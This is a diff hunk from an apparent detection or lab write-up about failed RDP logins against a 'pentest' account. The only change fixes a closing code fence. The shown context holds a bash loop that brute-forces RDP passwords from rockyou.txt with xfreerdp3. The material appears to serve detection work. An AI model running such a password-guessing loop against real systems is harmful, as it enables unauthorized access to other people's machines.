@@ -15,7 +15,8 @@ Repeated failed RDP login attempts targeting the user `pentest`:
 for pw in $(head -n 20 /usr/share/wordlists/rockyou.txt); do
   xfreerdp3 /u:pentest /p:"$pw" /v:192.168.1.48 +auth-only /cert:ignore
   sleep 1
-done ```
+done
+```
 
 ## Detection Evidence
 
